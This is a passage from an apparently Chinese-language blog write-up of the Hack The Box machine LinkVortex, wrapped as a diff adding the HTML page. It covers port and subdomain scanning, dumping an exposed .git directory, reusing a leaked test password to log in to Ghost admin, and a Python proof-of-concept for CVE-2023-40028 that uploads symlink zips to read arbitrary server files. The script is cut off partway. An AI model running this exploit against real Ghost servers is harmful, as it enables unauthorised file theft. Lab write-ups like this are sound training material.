@@ -1,0 +1,851 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fuk.png">
+  <link rel="icon" href="https://img.dkdun.cn/v1/2024/12/83e0272660805f52.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="butt3rf1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="git 泄露，由 symlinks 导致的任意文件读取漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-LinkVortex">
+<meta property="og:url" content="http://example.com/2025/04/14/HTB-LinkVortex/index.html">
+<meta property="og:site_name" content="(｡･ω･｡)Welcome~">
+<meta property="og:description" content="git 泄露，由 symlinks 导致的任意文件读取漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/3ea0caa5ce97e31a.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/4fad161c76b6ffe0.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/ab8813db5b318ff4.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/fde7fd1d3ca5a675.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/fba652650ac3af62.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/cbc5cbfb3323afe8.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/8b4dcdb8e66a3413.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/721ebb42f2ac91f6.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/cadfce2f14c13dfc.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/db9cabf1ef5d1047.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/4661678031b00741.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/bf1aca72a04a5f6c.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/d3c38f7b2c47fe7e.png">
+<meta property="article:published_time" content="2025-04-14T15:49:52.000Z">
+<meta property="article:modified_time" content="2025-04-14T16:48:17.066Z">
+<meta property="article:author" content="butt3rf1y">
+<meta property="article:tag" content="HTB 渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/3ea0caa5ce97e31a.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HTB-LinkVortex - (｡･ω･｡)Welcome~</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>butt3rf1y&#39;s Space</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://img.dkdun.cn/v1/2025/12/3473793514d205aa.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB-LinkVortex"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-14 23:49" pubdate>
+          2025年4月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+	<link rel="icon" href="https://img.dkdun.cn/v1/2024/12/e40f2f1a8320e35c.png" type="image/x-icon">
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB-LinkVortex</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年4月15日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>git 泄露，由 symlinks 导致的任意文件读取漏洞</p>
+<span id="more"></span>
+
+<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><h2 id="nmap-端口扫描"><a href="#nmap-端口扫描" class="headerlink" title="nmap 端口扫描"></a>nmap 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -A -Pn 10.10.11.47<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 19:34 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.47<br>Host is up (0.36s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)<br>|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)<br>80/tcp open  http    Apache httpd<br>|_http-title: Did not follow redirect to http://linkvortex.htb/<br>|_http-server-header: Apache<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=4/13%OT=22%CT=1%CU=33150%PV=Y%DS=3%DC=T%G=Y%TM=67FB<br>OS:A18A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(S<br>OS:P=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW<br>OS:7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%<br>OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53AN<br>OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=<br>OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A<br>OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4<br>OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=<br>OS:G%RIPCK=G%RUCK=F845%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 554/tcp)<br>HOP RTT       ADDRESS<br>1   0.40 ms   butt3rf1y.mshome.net (172.30.144.1)<br>2   404.35 ms 10.10.16.1<br>3   258.09 ms 10.10.11.47<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 41.82 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了 80 和 22 端口</p>
+<h2 id="访问-80-端口"><a href="#访问-80-端口" class="headerlink" title="访问 80 端口"></a>访问 80 端口</h2><p>80 端口除了得出使用了  <code>Ghost</code>  框架和有一个 <code>admin</code> 用户就没什么有用的信息了</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/3ea0caa5ce97e31a.png"></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/4fad161c76b6ffe0.png"></p>
+<h2 id="dirsearch-目录扫描"><a href="#dirsearch-目录扫描" class="headerlink" title="dirsearch 目录扫描"></a>dirsearch 目录扫描</h2><p>只有一个 <code>robots.txt</code></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/ab8813db5b318ff4.png"></p>
+<p>访问 <code>/robots.txt</code> 发现还有几个路由</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/fde7fd1d3ca5a675.png"></p>
+<p>只有 <code>/ghost</code> 路由才能访问上，得到了一个登录界面，但是没登录邮箱和密码</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/fba652650ac3af62.png"></p>
+<h2 id="gobuster-子域名扫描"><a href="#gobuster-子域名扫描" class="headerlink" title="gobuster 子域名扫描"></a>gobuster 子域名扫描</h2><p>目前来说没什么有用的信息，所以来对子域名进行枚举</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster vhost -u http://linkvortex.htb -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt --append-domain<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/cbc5cbfb3323afe8.png"></p>
+<p>有一个 <code>dev.linkvortex.htb</code> 子域名</p>
+<p>访问发现依然没有什么东西</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/8b4dcdb8e66a3413.png"></p>
+<p>再次对子域名目录进行扫描，发现了 <code>.git</code> 路由</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/721ebb42f2ac91f6.png"></p>
+<p>访问得到了很多文件，应该有 <code>.git</code> 泄露</p>
+<h1 id="git-泄露"><a href="#git-泄露" class="headerlink" title="git 泄露"></a>git 泄露</h1><p>用 <a target="_blank" rel="noopener" href="https://github.com/arthaud/git-dumper/tree/master">git-dumper</a> 把仓库 dump 到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git-dumper http://dev.linkvortex.htb/.git ./<br></code></pre></td></tr></table></figure>
+
+<p>用 <code>git status</code> 查看仓库的状态</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/cadfce2f14c13dfc.png"></p>
+<p>查看最近更新的 <code>/ghost/core/test/regression/api/admin</code> 下的 <code>authentication.test.js</code> 文件，在其中发现了一些形如下图的 email 和 password</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;complete setup&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">const</span> email = <span class="hljs-string">&#x27;test@example.com&#x27;</span>;<br>        <span class="hljs-keyword">const</span> password = <span class="hljs-string">&#x27;OctopiFociPilfer45&#x27;</span>;<br><br>        <span class="hljs-keyword">const</span> requestMock = <span class="hljs-title function_">nock</span>(<span class="hljs-string">&#x27;https://api.github.com&#x27;</span>)<br>          .<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/repos/tryghost/dawn/zipball&#x27;</span>)<br>          .<span class="hljs-title function_">query</span>(<span class="hljs-literal">true</span>)<br>          .<span class="hljs-title function_">replyWithFile</span>(<span class="hljs-number">200</span>, fixtureManager.<span class="hljs-title function_">getPathForFixture</span>(<span class="hljs-string">&#x27;themes/valid.zip&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>去 <code>linkvortex.htb/ghost/#/signin</code> 尝试登录，有很多个 email 和 passwd 都登不进去</p>
+<p>前面在网页中发现有 admin 账户，构造 <code>admin@linkvortex.htb</code> 邮箱，最后用下面的用户名和密码登录进去了</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">admin<span class="hljs-keyword">@linkvortex</span>.<span class="hljs-attribute">htb</span>:OctopiFociPilfer45<br></code></pre></td></tr></table></figure>
+
+<h2 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h2><p>登陆进去后通过 Wappalyzer  可以发现当前 <code>Ghost</code> 的版本是 5.58，找到了相关 CVE：<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-40028">CVE-2023-40028</a>， 5.59.1 之前的版本允许经过身份验证的用户上传符号链接文件（symlinks），导致任意文件读取操作</p>
+<h1 id="根据漏洞写-POC-脚本"><a href="#根据漏洞写-POC-脚本" class="headerlink" title="根据漏洞写 POC 脚本"></a>根据漏洞写 POC 脚本</h1><p>poc for <a target="_blank" rel="noopener" href="https://github.com/buutt3rf1y/CVE-2023-40028/">CVE-2023-40028</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> getopt<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">usage</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> --url &lt;http://example.com&gt; -u &lt;username&gt; -p &lt;password&gt;&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_name</span>(<span class="hljs-params">length=<span class="hljs-number">13</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=length))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_exploit</span>(<span class="hljs-params">file_to_read, payload_path, image_name</span>):<br>    <span class="hljs-comment"># 创建完整的目录结构</span><br>    image_dir = payload_path / <span class="hljs-string">&quot;content/images/2024&quot;</span><br>    image_dir.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># 创建符号链接文件</span><br>    symlinks_path = image_dir / <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span><br><br>    <span class="hljs-comment"># 创建 symlinks</span><br>    os.system(<span class="hljs-string">f&quot;ln -s <span class="hljs-subst">&#123;file_to_read&#125;</span> <span class="hljs-subst">&#123;symlinks_path&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># 打包 zip</span><br>    os.system(<span class="hljs-string">f&quot;zip -r -y <span class="hljs-subst">&#123;payload_path&#125;</span> ./exp/ &amp;&gt;/dev/null&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clean</span>(<span class="hljs-params">payload_path, image_name</span>):<br>    <span class="hljs-comment"># 清理产生的文件</span><br>    os.system(<span class="hljs-string">f&quot;rm -f <span class="hljs-subst">&#123;payload_path&#125;</span>/content/images/2024/<span class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span>)<br>    os.system(<span class="hljs-string">f&quot;rm -f <span class="hljs-subst">&#123;payload_path&#125;</span>.zip&quot;</span>)<br>    os.system(<span class="hljs-string">f&quot;rm -rf <span class="hljs-subst">&#123;payload_path&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        opts, _ = getopt.getopt(sys.argv[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot;u:p:&quot;</span>, [<span class="hljs-string">&quot;url=&quot;</span>])<br>    <span class="hljs-keyword">except</span> getopt.GetoptError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> --url &lt;http://example.com&gt; -u &lt;username&gt; -p &lt;password&gt;&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># 从命令行读取参数执行</span><br>    Ghost_Url = username = password = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> opt, arg <span class="hljs-keyword">in</span> opts:<br>        <span class="hljs-keyword">if</span> opt == <span class="hljs-string">&quot;-u&quot;</span>:<br>            username = arg<br>        <span class="hljs-keyword">elif</span> opt == <span class="hljs-string">&quot;-p&quot;</span>:<br>            password = arg<br>        <span class="hljs-keyword">elif</span> opt == <span class="hljs-string">&quot;--url&quot;</span>:<br>            Ghost_Url = arg.rstrip(<span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (Ghost_Url <span class="hljs-keyword">and</span> username <span class="hljs-keyword">and</span> password):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Necessary parameters are missing,maybe url or username or password...&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    Ghost_API = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/api/v3/admin/&#x27;</span><br>    payload_path = Path(__file__).parent / <span class="hljs-string">&quot;exp&quot;</span><br>    payload_path.mkdir(exist_ok=<span class="hljs-literal">True</span>, parents=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># curl 创建会话并保存 cookie</span><br>    os.system(<br>        <span class="hljs-string">f&quot;curl -c cookie.txt -d username=<span class="hljs-subst">&#123;username&#125;</span> -d password=<span class="hljs-subst">&#123;password&#125;</span> -H \&quot;Origin: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>\&quot; -H \&quot;Accept-Version: v3.0\&quot; <span class="hljs-subst">&#123;Ghost_API&#125;</span>session/ &gt; /dev/null 2&gt;&amp;1&quot;</span>)<br><br>    <span class="hljs-comment"># 检测 cookie 是否有效</span><br>    <span class="hljs-keyword">if</span> os.system(<span class="hljs-string">&quot;grep -q ghost-admin-api-session cookie.txt&quot;</span>) != <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br>        os.system(<span class="hljs-string">f&quot;rm -f cookie.txt&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_to_read = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;file&gt; &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> file_to_read.lower() == <span class="hljs-string">&quot;exit&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">in</span> file_to_read <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> file_to_read:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;please enter a valid file path:&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_to_read:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># 生成 payload</span><br>        image_name = generate_random_name()<br>        generate_exploit(file_to_read, payload_path, image_name)<br><br>        <span class="hljs-comment"># 上传 zip</span><br>        upload_path = os.popen(<br>            <span class="hljs-string">f&#x27;curl -s -b cookie.txt &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;X-Ghost-Version: 5.58&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;Referer: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;Origin: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-F &quot;importfile=@./exp.zip;type=application/zip&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;&quot;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/api/v3/admin/db&quot;&#x27;</span><br>        ).read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;error&quot;</span> <span class="hljs-keyword">in</span> upload_path.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;upload failed: <span class="hljs-subst">&#123;upload_path&#125;</span>!!!&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;upload successful!!!&quot;</span>)<br>            <br>        <span class="hljs-comment"># 读取目标文件</span><br>        file_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/content/images/2024/<span 